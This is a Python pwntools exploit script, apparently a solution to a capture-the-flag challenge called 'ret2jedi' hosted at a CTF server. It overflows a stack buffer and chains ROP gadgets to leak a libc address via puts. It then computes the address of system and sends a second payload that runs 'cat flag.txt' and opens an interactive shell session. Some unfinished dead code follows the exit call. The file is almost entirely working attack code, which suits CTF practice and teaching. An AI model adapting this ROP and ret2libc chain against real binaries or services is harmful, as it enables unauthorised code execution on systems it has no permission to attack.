#!/usr/bin/env python3

from pwn import *

retoff = 16

#ROP Gadgets
popRBP = p64(0x40113d)
#popRSI  and r15
popRSI = p64(0x00000000004012e1)
popRDI = p64(0x00000000004012e3)
popRSP = p64(0x00000000004012dd)
callRAX = p64(0x0000000000401014)

gets = p64(0x0040125a)
puts = p64(0x401255)

sh = 0x404700
shptr = 0x404800

#notTheFlag = p64(0x00401156)
#mightBe = p64(0x4011b5)

#putGOT = 0x404018
systemGOT = 0x0
stdoutGOT = 0x404048

#libcaddr = 0x404008
#libcput = 0x177380
local = False
pipe = False

if (local):
    libcstdout = 0x2bf6a0 #KALI
    libcsystem = 0x148e50 #KALI
else:
    libcstdout = 0x2c3520
    libcsystem = 0x14a830

libcdiff = libcstdout - libcsystem



exp = b"A" * retoff
exp += popRDI + p64(stdoutGOT)
exp += popRBP + p64(sh -0x30)
exp += puts
if (pipe):

    sys.stdout.buffer.write(exp + b'\n')
    addr = 0xf70000000000
else:
    if (local):
        prg = process("./ret2jedi")
    else:
        prg = remote("srv3.magpiectf.ca", 6600)
    print(prg.readline())
    prg.sendline(exp)
    prg.readline()
    addr = prg.readline()[:-1]
    #addr = b""
    print("addr packed = ", addr)
    addr += b'\0'*(8-len(addr))
    print("addr padded = ", addr)
    #print("len addr = ", len(addr))
    addr = u64(addr, endian="little")
    print("addr big = ", addr)
    print("addr = 0x%X" % addr)



libcsystem = addr - libcdiff

if (pipe):
    libcsystem = libcdiff


exp = b"B" * retoff
exp += popRBP + p64(shptr -0x20)
exp += popRDI + p64(sh)
exp += p64(libcsystem)
exp += b"cat flag.txt\0"
if pipe:
    sys.stdout.buffer.write(exp + b'\n')
else:
    prg.sendline(exp)
    prg.interactive()
#sys.stdout.buffer.write(b"This is a test")

exit()

exp = b"C"*retoff
exp += popRDI + p64()

#['sh',null]
exp = b"C"*retoff
exp += popRBP + p64(shptr+8 -0x20)
exp += gets
exp += p64(sh)
exp += p64(0)
sys.stdout.buffer.write(exp + b'\n')
